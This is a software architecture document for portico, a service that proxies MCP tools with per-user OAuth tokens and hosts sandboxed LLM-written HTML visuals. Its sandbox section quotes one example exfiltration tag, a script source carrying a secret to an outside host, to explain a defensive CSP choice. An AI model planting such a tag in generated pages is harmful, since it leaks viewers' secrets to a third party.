# portico — Architecture

portico is a single TypeScript service with **two capabilities on a shared
identity core**:

1. **Unified MCP proxy gateway** — Jean (or any MCP client) connects with **one
   bearer token per user** and sees the aggregated, namespaced tools of every
   upstream MCP server that user has linked. portico holds each user's per-service
   OAuth tokens server-side (AES-256-GCM encrypted) and proxies calls through.
2. **Visual host** — clients publish rich HTML and get back a login-gated URL to share
   (e.g. Jean posting a chart into a Slack thread). The page may run JavaScript, so it is
   served untrusted; see "The visual sandbox" below.

A small React **portal** at `/` is the human surface for both: sign in with Google,
link services, manage your token.

## Layering (Hexagonal / Clean)

Dependencies point **inward only**. Adapters implement ports; the interface layer
wires everything in the composition root. Most logic is testable against
in-memory fakes with no infrastructure.

```
web/          (portal)           React + Vite; talks only to /api/*
    │  HTTP
    ▼
interface/   (pages/templates)  HTTP routes, /api, /mcp endpoint, composition root
    │  depends on
    ▼
application/  (molecules)        use-cases composing domain + ports
    │  depends on
    ▼
domain/       (atoms)            pure entities, value objects, policies — no I/O
    ▲  implements
    │
ports/        (sockets)          interfaces the inner layers depend on
    ▲
    │  implements
adapters/     (organisms)        Postgres, Azure Blob, filesystem, Google OIDC, crypto, MCP client
```

| Directory | Responsibility | May import |
|-----------|----------------|------------|
| `src/domain/` | Entities, value objects, pure policies (allowed-domain rule, tool namespacing, token-refresh policy). No framework or I/O imports. | nothing (self-contained) |
| `src/ports/` | Structural interfaces (`UserStore`, `TokenStore`, `ConnectionVault`, `ArtifactStore`, `OidcVerifier`, …). | `domain/` types only |
| `src/application/` | Use-cases (identity, connections, proxy, artifacts) orchestrating domain + ports. | `domain/`, `ports/` |
| `src/adapters/` | Concrete infra implementing ports (pg, Azure SDKs, node:fs, jose, node:crypto, MCP SDK client). | `ports/`, `domain/`, external SDKs |
| `src/interface/` | Delivery: Express routes, the portal's `/api/*` surface, the Streamable-HTTP `/mcp` endpoint, and the composition root. | everything |
| `web/` | The React portal. Knows nothing of the server beyond the `/api/*` contract. | — |
| `src/config.ts` | Cross-cutting: `PORTICO_*` env → typed `Settings`. | zod |
| `src/main.ts` | Bootstrap: load config, open pool, start server. | `config`, `interface` |

## Two auth planes

This separation is the core idea — it's what lets one token reach many services.

- **Identity** — `/login` → Google OIDC → verify `id_token` against Google's JWKS,
  enforce the allowed-domain policy (`hd` claim, falling back to the email domain)
  → upsert user → mint an opaque bearer token (stored hashed) for Jean's config
  **and** set a signed session cookie for the portal and artifact viewing.
  A gated route bounces the visitor to `/login?next=<path>` and sign-in returns them
  there instead of to the portal — clicking a shared `/visual/<id>` link and signing in
  lands on that visual. Only same-site paths are honoured, so `next` cannot be turned
  into an open redirect.
- **Connections** — per user, per upstream OAuth 2.1 auth-code + PKCE against each
  vendor; tokens encrypted in the vault; auto-refresh on expiry. Linking or
  unlinking a service never changes the user's portico token.

Because bearer tokens are stored hashed, an existing one can never be re-displayed.
The portal's "generate new token" revokes every previous token and shows the new
value exactly once.

## The visual sandbox

A published visual is HTML an LLM wrote. It runs JavaScript — that is the point, it is how
a chart draws — so it is treated as hostile code and given two documents instead of one:

| Route | Content | Trust |
|---|---|---|
| `/visual/:id` | Portico's own shell: a title bar and an `<iframe>`. No script of its own. | Trusted |
| `/visual/:id/raw` | The stored artifact bytes. | **Untrusted** |

The shell frames the artifact with `sandbox="allow-scripts"` and **not**
`allow-same-origin`. That combination hands the artifact an *opaque* origin: its script
cannot read the portico session cookie or `localStorage`, cannot see the shell document,
and — with no `allow-top-navigation` — cannot redirect the tab. Granting `allow-scripts`
and `allow-same-origin` together would let the framed page reach into its own DOM and
delete that very attribute, so **they must never both appear**. This is the load-bearing
invariant of the visual host; `visual-shell.test.ts` asserts it, and the Playwright suite
observes a real browser enforce it.

The artifact's CSP then removes every way out: `connect-src 'none'` (no fetch, XHR,
WebSocket, or beacon) and no external origin anywhere in the policy. That second half
matters more than it looks — an external `<script src="//host/?d=SECRET">` is an outbound
GET carrying stolen data, so *any* permitted external origin is an exfiltration channel no
matter how tight `connect-src` is. That is why CDNs are banned outright rather than
allowlisted, and why ECharts and Mermaid are vendored same-origin under `/vendor/` at
version-pinned, immutable paths: a visual hard-codes the path it was written against, so
those bytes are never replaced, only added to. Script runs, but it is boxed in: it cannot
fetch, open a socket, read the session cookie, reach the parent page, or see another
artifact — the most a hostile artifact can leak is data it already embedded in itself, by
navigating its own opaque frame; never a viewer's secret.

Both routes are session-gated and both run the full visibility check. `/raw` is a URL a
person can paste into a browser, so it defends itself rather than trusting the shell to
have done it.

## Adapter selection

Chosen at boot, so the same code runs locally and in Azure:

| Port | No `PORTICO_DATABASE_URL` | With a database |
|---|---|---|
| Users, tokens, vault, OAuth state, artifact metadata | in-memory (tests, throwaway dev) | Postgres |
| Artifact bytes | in-memory | Azure Blob if `PORTICO_ARTIFACT_BLOB_ACCOUNT` is set, else the local filesystem |

## Testing strategy

Domain and application layers are exercised against in-memory fakes of the ports —
no Postgres, Azure, or network. Adapters get their own tests: the Google OIDC
verifier runs its real verification path against a fake Google (local JWKS + token
endpoint), and the proxy path against a fake upstream MCP server. Route tests boot
the full app and drive it over HTTP, covering login, linking, the portal's API
(including its CSRF defenses), and the `/mcp` endpoint.

See `docs/superpowers/specs/2026-07-11-portico-design.md` for the original design
and implementation milestones.
